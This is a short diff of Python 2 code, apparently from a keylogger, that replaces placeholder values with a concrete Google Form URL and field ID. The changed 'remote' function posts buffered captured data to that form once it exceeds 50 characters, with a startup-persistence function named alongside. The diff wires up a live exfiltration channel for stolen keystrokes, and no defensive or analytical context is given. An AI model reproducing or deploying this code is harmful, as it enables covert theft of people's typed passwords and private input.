@@ -47,8 +47,8 @@ def addStartup():
 def remote():
     global data
     if len(data)>50:
-        url="https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/formResponse" #Specify Google Form URL here
-        klog={'entry.xxxxxxxxxx':data} #Specify the Field Name here
+        url="https://docs.google.com/forms/d/e/1FAIpQLScn5t_YHEXmtyAQi3QlSeHYY72YTW7cNF2Uk-G2gRNVWMHdsg/formResponse" #Specify Google Form URL here
+        klog={'entry.1599653143':data} #Specify the Field Name here
         try:
             dataenc=urllib.urlencode(klog)
             req=urllib2.Request(url,dataenc)
